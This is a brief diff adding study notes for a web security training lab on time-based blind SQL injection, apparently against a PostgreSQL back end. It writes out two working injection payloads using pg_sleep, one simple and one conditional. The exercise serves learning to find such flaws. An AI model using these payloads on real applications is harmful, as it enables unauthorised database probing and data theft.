@@ -1,0 +1,7 @@
+Lab #14: Blind SQL injection with time delays
+
+1. Submit a time delay or 10 seconds
+'||pg_sleep(10)--
+or using conditional statement
+l'; SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END --
+
